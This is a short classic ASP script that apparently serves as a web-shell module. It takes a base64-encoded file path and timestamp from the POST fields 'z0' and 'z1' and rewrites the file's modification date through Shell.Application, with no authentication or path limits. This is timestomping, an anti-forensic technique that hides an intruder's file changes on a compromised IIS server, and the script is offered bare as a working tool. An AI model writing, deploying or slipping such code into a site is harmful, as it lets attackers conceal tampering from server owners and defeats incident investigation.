<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    If Trim(str) = "" Then
        Base64Decode = ""
        Exit Function
    End If
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    Base64Decode = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function UnixTimestampToDate(timestamp)
    Dim baseDate
    baseDate = DateSerial(1970, 1, 1) + TimeSerial(0, 0, 0)
    ' 加上秒數並調整為當地時區時間 (假設伺服器為當地時間，通常直接加秒數)
    UnixTimestampToDate = DateAdd("s", timestamp, baseDate)
End Function

Function TouchFile(filePath, targetDate)
    Dim fso, shell, folderPath, fileName, objFolder, objFolderItem
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FileExists(filePath) Then
        TouchFile = "0|File does not exist."
        Exit Function
    End If
    
    folderPath = fso.GetParentFolderName(filePath)
    fileName = fso.GetFileName(filePath)
    
    On Error Resume Next
    Set shell = Server.CreateObject("Shell.Application")
    Set objFolder = shell.NameSpace(folderPath)
    Set objFolderItem = objFolder.ParseName(fileName)
    
    objFolderItem.ModifyDate = targetDate
    
    If Err.Number = 0 Then
        TouchFile = "1|"
    Else
        TouchFile = "0|Failed to modify the timestamps. Error: " & Err.Description
    End If
    
    Set objFolderItem = Nothing
    Set objFolder = Nothing
    Set shell = Nothing
    Set fso = Nothing
End Function

Sub Main()
    Dim z0, z1, filename, timestampStr, timestamp, targetDate
    
    z0 = Request.Form("z0")
    z1 = Request.Form("z1")
    
    If Trim(z0) = "" Or Trim(z1) = "" Then
        Response.Write "0|Missing parameters."
        Exit Sub
    End If
    
    filename = Base64Decode(z0)
    timestampStr = Base64Decode(z1)
    
    If Not IsNumeric(timestampStr) Then
        Response.Write "0|Invalid timestamp format."
        Exit Sub
    End If
    
    timestamp = CDbl(timestampStr)
    targetDate = UnixTimestampToDate(timestamp)
    
    Response.Write TouchFile(filename, targetDate)
End Sub

Main
%>